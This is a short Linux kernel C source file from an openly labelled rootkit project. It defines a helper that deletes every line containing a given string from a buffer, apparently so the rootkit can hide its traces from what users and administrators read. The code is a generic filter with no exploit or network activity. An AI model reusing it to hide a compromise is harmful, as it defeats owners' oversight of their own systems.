// SPDX-License-Identifier: GPL-2.0
#include <linux/string.h>
#include <linux/types.h>
#include "rootkit.h"

#include "replace.h"

size_t rk_remove_lines(unsigned char *buffer, size_t length,
		       const unsigned char *target, size_t target_length)
{
	size_t read_pos = 0;
	size_t write_pos = 0;

	if (target_length == 0 || target_length > length)
		return length;

	while (read_pos < length) {
		const unsigned char *line = buffer + read_pos;
		const unsigned char *nl = memchr(line, '\n',
						 length - read_pos);
		size_t line_len = nl ? (size_t)(nl - line + 1)
				     : (length - read_pos);
		int match = 0;

		if (line_len >= target_length) {
			size_t end = line_len - target_length;
			size_t i;

			for (i = 0; i <= end; i++) {
				if (memcmp(line + i, target,
					   target_length) == 0) {
					match = 1;
					break;
				}
			}
		}
		if (!match) {
			if (write_pos != read_pos)
				memmove(buffer + write_pos, line, line_len);
			write_pos += line_len;
		}
		read_pos += line_len;
	}
	return write_pos;
}
